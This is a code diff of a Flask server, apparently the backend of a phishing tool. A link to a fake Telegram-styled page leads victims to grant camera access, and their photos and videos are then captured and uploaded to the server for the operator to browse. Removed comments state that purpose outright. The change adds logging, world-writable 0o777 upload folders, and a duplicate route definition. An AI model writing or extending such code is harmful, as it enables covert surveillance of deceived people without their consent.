@@ -1,8 +1,10 @@
 from flask import Flask, render_template, request, redirect, url_for, send_from_directory
 import os
 from datetime import datetime
+import logging
 
 app = Flask(__name__)
+logging.basicConfig(level=logging.DEBUG)
 
 # Configuração das pastas de upload
 if os.environ.get('RENDER'):
@@ -10,22 +12,44 @@ if os.environ.get('RENDER'):
     UPLOAD_FOLDER = '/opt/render/project/src/uploads'
 else:
     # Caminho local
-    UPLOAD_FOLDER = 'uploads'
+    UPLOAD_FOLDER = os.path.abspath('uploads')
 
 FOTOS_FOLDER = os.path.join(UPLOAD_FOLDER, 'fotos')
 VIDEOS_FOLDER = os.path.join(UPLOAD_FOLDER, 'videos')
 
 # Criar as pastas se não existirem
-os.makedirs(FOTOS_FOLDER, exist_ok=True)
-os.makedirs(VIDEOS_FOLDER, exist_ok=True)
+try:
+    os.makedirs(FOTOS_FOLDER, exist_ok=True)
+    os.makedirs(VIDEOS_FOLDER, exist_ok=True)
+    # Dar permissões totais às pastas
+    os.chmod(UPLOAD_FOLDER, 0o777)
+    os.chmod(FOTOS_FOLDER, 0o777)
+    os.chmod(VIDEOS_FOLDER, 0o777)
+    app.logger.info(f'Pastas criadas: {UPLOAD_FOLDER}, {FOTOS_FOLDER}, {VIDEOS_FOLDER}')
+except Exception as e:
+    app.logger.error(f'Erro ao criar pastas: {str(e)}')
 
 app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
 app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024  # limite de 16MB por arquivo
 
 # Rota para servir arquivos de upload
-@app.route('/uploads/<path:filename>')
-def uploaded_file(filename):
-    return send_from_directory(UPLOAD_FOLDER, filename)
+@app.route('/uploads/fotos/<filename>')
+def foto_file(filename):
+    app.logger.info(f'Tentando acessar foto: {filename}')
+    try:
+        return send_from_directory(FOTOS_FOLDER, filename)
+    except Exception as e:
+        app.logger.error(f'Erro ao acessar foto {filename}: {str(e)}')
+        return 'Erro ao acessar arquivo', 404
+
+@app.route('/uploads/videos/<filename>')
+def video_file(filename):
+    app.logger.info(f'Tentando acessar vídeo: {filename}')
+    try:
+        return send_from_directory(VIDEOS_FOLDER, filename)
+    except Exception as e:
+        app.logger.error(f'Erro ao acessar vídeo {filename}: {str(e)}')
+        return 'Erro ao acessar arquivo', 404
 
 @app.route('/')
 def index():
@@ -38,32 +62,40 @@ def pagina_fake():
 
 @app.route('/telegram')
 def telegram():
-    # Esta página será aberta quando o link copiado for acessado.
-    # Ela precisará conter o JavaScript para solicitar acesso à câmera,
-    # tirar a foto, gravar o vídeo e enviar para o servidor.
-    return render_template('telegram.html') # Criaremos este arquivo HTML
+    return render_template('telegram.html')
+
+@app.route('/telegram')
+def acessar_camera():
+    return render_template('telegram.html')
 
 @app.route('/salvar_midia', methods=['POST'])
 def salvar_midia():
-    response = {'success': False, 'message': ''}
+    response = {'success': False, 'message': '', 'path': ''}
     
     try:
         if 'foto' in request.files:
             foto = request.files['foto']
             if foto.filename != '':
                 nome_foto = f"{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
-                foto.save(os.path.join(FOTOS_FOLDER, nome_foto))
+                caminho_foto = os.path.join(FOTOS_FOLDER, nome_foto)
+                foto.save(caminho_foto)
+                app.logger.info(f'Foto salva em: {caminho_foto}')
                 response['success'] = True
+                response['path'] = f'/uploads/fotos/{nome_foto}'
                 
         if 'video' in request.files:
             video = request.files['video']
             if video.filename != '':
                 nome_video = f"{datetime.now().strftime('%Y%m%d_%H%M%S')}.webm"
-                video.save(os.path.join(VIDEOS_FOLDER, nome_video))
+                caminho_video = os.path.join(VIDEOS_FOLDER, nome_video)
+                video.save(caminho_video)
+                app.logger.info(f'Vídeo salvo em: {caminho_video}')
                 response['success'] = True
+                response['path'] = f'/uploads/videos/{nome_video}'
                 
         response['message'] = 'Mídia salva com sucesso!'
     except Exception as e:
+        app.logger.error(f'Erro ao salvar mídia: {str(e)}')
         response['message'] = f'Erro ao salvar mídia: {str(e)}'
     
     return response
@@ -72,7 +104,9 @@ def salvar_midia():
 def listar_fotos():
     try:
         fotos = os.listdir(FOTOS_FOLDER)
-    except:
+        app.logger.info(f'Fotos encontradas: {fotos}')
+    except Exception as e:
+        app.logger.error(f'Erro ao listar fotos: {str(e)}')
         fotos = []
     return render_template('fotos.html', fotos=fotos)
 
@@ -80,7 +114,9 @@ def listar_fotos():
 def listar_videos():
     try:
         videos = os.listdir(VIDEOS_FOLDER)
-    except:
+        app.logger.info(f'Vídeos encontrados: {videos}')
+    except Exception as e:
+        app.logger.error(f'Erro ao listar vídeos: {str(e)}')
         videos = []
     return render_template('videos.html', videos=videos)
 
